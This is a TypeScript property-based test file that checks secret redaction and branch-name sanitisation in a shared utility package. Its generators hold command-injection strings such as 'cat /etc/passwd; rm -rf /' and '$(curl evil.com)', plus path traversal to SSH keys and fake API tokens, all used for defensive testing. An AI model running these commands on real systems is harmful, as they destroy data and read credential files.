/**
 * Shared Utilities Property-Based Tests (QA-025)
 *
 * Verifies security-critical invariants of @positron/shared's utilities
 * against randomly generated dangerous inputs using fast-check.
 *
 * Functions tested:
 *  - redactValue()  — secret masking (6 invariants)
 *  - generateBranchName() — branch name safety (7 invariants)
 *
 * All generated values are synthetic fakes. No real secrets or tokens.
 */

import { describe, it, expect } from 'vitest';
import fc from 'fast-check';
import { redactValue, generateBranchName } from '@positron/shared';

// =========================================================================
// GENERATORS: Secret/Token Patterns (Phase 4)
// =========================================================================

/** A fake GitHub PAT token matching the ghp_ pattern (36 alphanumeric chars after prefix) */
const fakeGhpTokenArb = fc
	.string({
		minLength: 36,
		maxLength: 36,
		unit: fc.constantFrom(...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'),
	})
	.map((s) => `ghp_${s}`);

/** A fake OpenAI API key (48+ chars after sk- prefix) */
const fakeOpenAIKeyArb = fc
	.string({
		minLength: 52,
		maxLength: 52,
		unit: fc.constantFrom(...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'),
	})
	.map((s) => `sk-${s}`);

/** A fake Anthropic API key (40+ chars after anthropic_ prefix) */
const fakeAnthropicKeyArb = fc
	.string({
		minLength: 44,
		maxLength: 44,
		unit: fc.constantFrom(...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'),
	})
	.map((s) => `anthropic_${s}`);

/** A fake GitHub v2 token (82 chars after github_pat_ prefix) */
const fakeGithubPatV2Arb = fc
	.string({
		minLength: 82,
		maxLength: 82,
		unit: fc.constantFrom(...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'),
	})
	.map((s) => `github_pat_${s}`);

/** A fake Gemini key (35 chars after AIza prefix) */
const fakeGeminiKeyArb = fc
	.string({
		minLength: 35,
		maxLength: 35,
		unit: fc.constantFrom(...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'),
	})
	.map((s) => `AIza${s}`);

/** Any fake secret-like string */
const secretStringArb = fc.oneof(
	fakeGhpTokenArb,
	fakeOpenAIKeyArb,
	fakeAnthropicKeyArb,
	fakeGithubPatV2Arb,
	fakeGeminiKeyArb,
);

/** A string containing a secret embedded in normal text */
const secretInContextArb = fc.oneof(
	fc.tuple(fc.constant('token='), secretStringArb).map(([p, s]) => p + s),
	fc.tuple(fc.constant('Authorization: Bearer '), secretStringArb).map(([p, s]) => p + s),
	fc.tuple(fc.constant('x-api-key: '), secretStringArb).map(([p, s]) => p + s),
	fc.tuple(secretStringArb, fc.constant(' is the secret')).map(([s, e]) => s + e),
);

/** A string containing MULTIPLE different fake secrets */
const multiSecretStringArb = fc
	.tuple(secretStringArb, secretStringArb, fc.constant('-'))
	.map(([a, b, sep]) => `${a}${sep}${b}`);

/** An object with a secret at various nesting depths */
const nestedSecretObjectArb = fc.oneof(
	fc.record({ token: secretStringArb, user: fc.constant('test') }),
	fc.record({
		config: fc.record({ auth: fc.record({ key: secretStringArb }) }),
	}),
	fc.record({
		providers: fc.array(fc.record({ type: fc.constant('api'), secret: secretStringArb }), {
			minLength: 1,
			maxLength: 3,
		}),
	}),
);

/** An array containing secrets */
const arrayWithSecretsArb = fc.array(
	fc.oneof(fc.constant('safe-value'), secretStringArb, fc.constant(42)),
	{ minLength: 2, maxLength: 10 },
);

/** A safe primitive (non-secret) */
const safePrimitiveArb = fc.oneof(
	fc.constant(null),
	fc.constant(undefined),
	fc.integer({ min: -1000, max: 1000 }),
	fc.boolean(),
	fc
		.string({ minLength: 0, maxLength: 20 })
		.filter((s) => !s.startsWith('ghp_') && !s.startsWith('sk-')),
);

// =========================================================================
// GENERATORS: Branch Name Inputs (Phase 6)
// =========================================================================

/** Characters considered "shell metacharacters" */
const SHELL_METACHARS = ';&|`$\\<>()\n\r\t';
const shellCharArb = fc.constantFrom(...SHELL_METACHARS.split(''));

/** Path traversal patterns */
const pathTraversalArb = fc.constantFrom(
	'../',
	'..\\',
	'/etc/passwd',
	'C:\\Windows\\System32',
	'../../.ssh/id_rsa',
	'....//',
	'..;/',
);

/** A title containing shell metacharacters */
const dangerousTitleArb = fc.oneof(
	// Title with shell chars scattered throughout
	fc
		.tuple(
			fc.string({ minLength: 2, maxLength: 10 }),
			fc.array(shellCharArb, { minLength: 1, maxLength: 3 }),
			fc.string({ minLength: 2, maxLength: 10 }),
		)
		.map(([pre, chars, post]) => pre + chars.join('') + post),
	// Title with path traversal
	fc
		.tuple(
			fc.string({ minLength: 0, maxLength: 5 }),
			pathTraversalArb,
			fc.string({ minLength: 0, maxLength: 5 }),
		)
		.map(([pre, trav, post]) => pre + trav + post),
	// Title with command injection attempts
	fc.constantFrom(
		'cat /etc/passwd; rm -rf /',
		'$(curl evil.com)',
		'`id`',
		'foo | bar & baz',
		'test > /dev/null < input',
		'echo $(whoami)',
		'a\nb\rc\td',
	),
);

/** A safe title (should produce clean branch names) */
const safeTitleArb = fc
	.string({ minLength: 1, maxLength: 30 })
	.filter((s) => /^[a-zA-Z0-9 _-]+$/.test(s) && s.trim().length > 0);

/** A title with unicode / non-ASCII characters */
const unicodeTitleArb = fc.oneof(
	fc.constantFrom(
		'Überarbeitung der Benutzerführung',
		'résumé fix',
		'日本語のテスト',
		'тестовый запуск',
	),
	fc.string({
		minLength: 3,
		maxLength: 15,
		unit: fc.constantFrom(...'äöüÄÖÜßéèêëñç'),
	}),
);

// =========================================================================
// redactValue() PROPERTIES (Phase 5)
// =========================================================================

describe('redactValue() security invariants', () => {
	// Property 1: Secret-ähnliche Werte werden nie im Klartext zurückgegeben
	it('never returns a fake secret in plaintext', () => {
		fc.assert(
			fc.property(secretStringArb, (secret) => {
				const result = redactValue(secret);
				// The original secret string must not appear in the output
				expect(result).not.toContain(secret);
				// The output should contain a redaction marker
				expect(result).toContain('***REDACTED***');
			}),
			{ numRuns: 1000 },
		);
	});

	// Property 1b: Secrets in context (prefix/suffix) are still redacted
	it('redacts secrets embedded in normal text', () => {
		fc.assert(
			fc.property(secretInContextArb, (input) => {
				const result = redactValue(input);
				// Redaction marker must be present
				expect(result).toContain('***REDACTED***');
			}),
			{ numRuns: 500 },
		);
	});

	// Property 2: Verschachtelte Objekte leaken keine Secrets
	it('objects with nested secrets are fully redacted', () => {
		fc.assert(
			fc.property(nestedSecretObjectArb, (obj) => {
				const result = redactValue(obj);
				// The JSON representation must have redaction markers
				expect(result).toContain('***REDACTED***');
				// No secret pattern should appear intact
				expect(result).not.toMatch(/ghp_[a-zA-Z0-9]{36}/);
				expect(result).not.toMatch(/sk-[a-zA-Z0-9]{48,}/);
				expect(result).not.toMatch(/anthropic_[a-zA-Z0-9]{40,}/);
				// Should be valid-ish JSON (we can parse it back)
				expect(() => JSON.parse(result)).not.toThrow();
			}),
			{ numRuns: 500 },
		);
	});

	// Property 3: Arrays leaken keine Secrets
	it('arrays with secrets are redacted', () => {
		fc.assert(
			fc.property(arrayWithSecretsArb, (arr) => {
				const result = redactValue(arr);
				const json = JSON.stringify(arr);
				const hasSecret =
					json.includes('ghp_') ||
					json.includes('sk-') ||
					json.includes('anthropic_') ||
					json.includes('github_pat_') ||
					json.includes('AIza');
				if (hasSecret) {
					expect(result).toContain('***REDACTED***');
					expect(() => JSON.parse(result)).not.toThrow();
				} else {
					// No secrets in this array — should parse back safely
					expect(() => JSON.parse(result)).not.toThrow();
				}
			}),
			{ numRuns: 500 },
		);
	});

	// Property 4: Primitive Nicht-Secrets bleiben stabil
	it('safe primitives are never aggressively masked', () => {
		fc.assert(
			fc.property(safePrimitiveArb, (value) => {
				const result = redactValue(value as string | number | boolean | null | undefined);
				// Should never throw
				expect(typeof result).toBe('string');
				// Safe values should not contain REDACTED unless they're actually secrets
				if (value !== null && value !== undefined) {
					const str = String(value);
					const isSecretLike =
						str.startsWith('ghp_') ||
						str.startsWith('sk-') ||
						str.startsWith('anthropic_') ||
						str.startsWith('github_pat_') ||
						str.startsWith('AIza');
					if (!isSecretLike) {
						// Safe values should not be falsely redacted
						expect(result).not.toContain('***REDACTED***');
					}
				}
			}),
			{ numRuns: 1000 },
		);
	});

	// Property 5: Circular / unserializable values have a safe fallback
	it('circular references produce a safe fallback (no crash)', () => {
		fc.assert(
			fc.property(fc.constant(null), () => {
				const circular: Record<string, unknown> = { name: 'test' };
				circular.self = circular;

				// redactValue uses JSON.stringify internally, which throws on circular refs
				const result = redactValue(circular);
				expect(typeof result).toBe('string');
				// Should return the fallback message
				expect(result).toBe('[Unserializable]');
			}),
			{ numRuns: 10 },
		);
	});

	// Property 6: Mehrere Secrets in einem Input werden alle maskiert
	it('multiple secrets in one string are all redacted', () => {
		fc.assert(
			fc.property(multiSecretStringArb, (input) => {
				const result = redactValue(input);
				// Should have at least 2 REDACTED entries (one per secret)
				const matches = (result.match(/\*\*\*REDACTED\*\*\*/g) || []).length;
				// At least one redaction occurred (exact count depends on how the secrets overlap)
				expect(matches).toBeGreaterThanOrEqual(1);
			}),
			{ numRuns: 500 },
		);
	});

	// Additional: always returns a string, never throws
	it('never throws on any input', () => {
		fc.assert(
			fc.property(
				fc.oneof(
					fc.constant(null),
					fc.constant(undefined),
					fc.integer(),
					fc.boolean(),
					fc.string(),
					fc.object(),
					fc.array(fc.anything()),
				),
				(value) => {
					expect(() => redactValue(value)).not.toThrow();
					const result = redactValue(value);
					expect(typeof result).toBe('string');
				},
			),
			{ numRuns: 1000 },
		);
	});
});

// =========================================================================
// generateBranchName() PROPERTIES (Phase 7)
// =========================================================================

describe('generateBranchName() security invariants', () => {
	// Property 1: Output is never empty
	it('never returns an empty string', () => {
		fc.assert(
			fc.property(
				fc.integer({ min: 1, max: 99999 }),
				fc.string({ minLength: 0, maxLength: 100 }),
				(issueNumber, title) => {
					const name = generateBranchName(issueNumber, title);
					expect(name.length).toBeGreaterThan(0);
					// At minimum contains "positron/issue-N"
					expect(name).toContain('positron/issue-');
				},
			),
			{ numRuns: 1000 },
		);
	});

	// Property 2: No shell metacharacters in output
	it('contains NO shell metacharacters', () => {
		fc.assert(
			fc.property(fc.integer({ min: 1, max: 99999 }), dangerousTitleArb, (issueNumber, title) => {
				const name = generateBranchName(issueNumber, title);

				// The full branch name must not contain shell metacharacters
				// (except slash in "positron/issue-N-" prefix)
				const slug = name.replace(/^positron\/issue-\d+-/, '');
				for (const char of SHELL_METACHARS) {
					expect(name).not.toContain(char);
				}
			}),
			{ numRuns: 1000 },
		);
	});

	// Property 3: No path traversal in output
	it('contains NO path traversal patterns', () => {
		fc.assert(
			fc.property(fc.integer({ min: 1, max: 99999 }), dangerousTitleArb, (issueNumber, title) => {
				const name = generateBranchName(issueNumber, title);

				// Must not contain path traversal sequences
				expect(name).not.toContain('..');
				expect(name).not.toContain('/etc/');
				expect(name).not.toContain('C:\\');
				// Only allowed slash is the one in positron/issue-
				const slashesOutsidePrefix = name.replace('positron/issue-', '').match(/\//g);
				expect(slashesOutsidePrefix).toBeNull();
			}),
			{ numRuns: 1000 },
		);
	});

	// Property 4: Determinism
	it('produces identical output for identical input', () => {
		fc.assert(
			fc.property(
				fc.integer({ min: 1, max: 99999 }),
				fc.string({ minLength: 0, maxLength: 100 }),
				(issueNumber, title) => {
					const name1 = generateBranchName(issueNumber, title);
					const name2 = generateBranchName(issueNumber, title);
					expect(name1).toBe(name2);
				},
			),
			{ numRuns: 1000 },
		);
	});

	// Property 5: Length is bounded
	it('slug portion never exceeds 50 characters', () => {
		fc.assert(
			fc.property(
				fc.integer({ min: 1, max: 99999 }),
				fc.string({ minLength: 0, maxLength: 500 }),
				(issueNumber, title) => {
					const name = generateBranchName(issueNumber, title);
					// The slug part (after positron/issue-N-) is truncated to 50 chars
					const slug = name.replace(/^positron\/issue-\d+-/, '');
					expect(slug.length).toBeLessThanOrEqual(50);
				},
			),
			{ numRuns: 1000 },
		);
	});

	// Property 6: Only allowed branch characters in slug
	it('slug contains only [a-z0-9-] characters', () => {
		fc.assert(
			fc.property(
				fc.integer({ min: 1, max: 99999 }),
				fc.string({ minLength: 0, maxLength: 100 }),
				(issueNumber, title) => {
					const name = generateBranchName(issueNumber, title);
					const slug = name.replace(/^positron\/issue-\d+-/, '');
					// Slug should only contain lowercase alphanumeric and hyphens
					if (slug.length > 0) {
						expect(slug).toMatch(/^[a-z0-9-]+$/);
					}
				},
			),
			{ numRuns: 1000 },
		);
	});

	// Property 7: No leading/trailing problematic characters in slug
	it('slug does not start or end with hyphens', () => {
		fc.assert(
			fc.property(
				fc.integer({ min: 1, max: 99999 }),
				fc.string({ minLength: 0, maxLength: 100 }),
				(issueNumber, title) => {
					const name = generateBranchName(issueNumber, title);
					const slug = name.replace(/^positron\/issue-\d+-/, '');
					if (slug.length > 0) {
						expect(slug).not.toMatch(/^-/);
						expect(slug).not.toMatch(/-$/);
					}
				},
			),
			{ numRuns: 1000 },
		);
	});

	// Additional: Unicode/umlauts are normalized (stripped to ASCII)
	it('unicode titles produce ASCII-only slug output', () => {
		fc.assert(
			fc.property(fc.integer({ min: 1, max: 99999 }), unicodeTitleArb, (issueNumber, title) => {
				const name = generateBranchName(issueNumber, title);
				// The full string (including prefix) should be ASCII
				expect(name).toMatch(/^[a-zA-Z0-9\/\-]+$/);
			}),
			{ numRuns: 500 },
		);
	});

	// Additional: Different issue numbers produce different prefixes
	it('different issue numbers produce different branch names', () => {
		fc.assert(
			fc.property(
				fc.integer({ min: 1, max: 10000 }),
				fc.integer({ min: 1, max: 10000 }),
				fc.string(),
				(n1, n2, title) => {
					fc.pre(n1 !== n2);
					const name1 = generateBranchName(n1, title);
					const name2 = generateBranchName(n2, title);
					expect(name1).not.toBe(name2);
				},
			),
			{ numRuns: 500 },
		);
	});
});

// =========================================================================
// NEGATIVE ASSURANCE (Phase 8)
// =========================================================================
describe('Negative Assurance: generators produce dangerous values', () => {
	it('secretStringArb produces strings containing secret prefixes', () => {
		fc.assert(
			fc.property(secretStringArb, (secret) => {
				const hasSecretPrefix =
					secret.startsWith('ghp_') ||
					secret.startsWith('sk-') ||
					secret.startsWith('anthropic_') ||
					secret.startsWith('github_pat_') ||
					secret.startsWith('AIza');
				expect(hasSecretPrefix).toBe(true);
			}),
			{ numRuns: 500 },
		);
	});

	it('dangerousTitleArb produces strings with shell metacharacters or path traversal', () => {
		fc.assert(
			fc.property(dangerousTitleArb, (title) => {
				const hasDanger =
					[...SHELL_METACHARS].some((c) => title.includes(c)) ||
					title.includes('..') ||
					title.includes('/etc/') ||
					title.includes('C:\\');
				expect(hasDanger).toBe(true);
			}),
			{ numRuns: 500 },
		);
	});

	it('nestedSecretObjectArb produces objects with nested secrets', () => {
		fc.assert(
			fc.property(nestedSecretObjectArb, (obj) => {
				const json = JSON.stringify(obj);
				expect(json).toMatch(/ghp_|sk-|anthropic_|github_pat_|AIza/);
			}),
			{ numRuns: 300 },
		);
	});

	it('multiSecretStringArb contains at least two distinct secrets', () => {
		fc.assert(
			fc.property(multiSecretStringArb, (str) => {
				// Should have a hyphen separator between two secrets
				expect(str).toContain('-');
				// Both parts should exist
				const parts = str.split('-');
				expect(parts.length).toBeGreaterThan(1);
			}),
			{ numRuns: 300 },
		);
	});
});
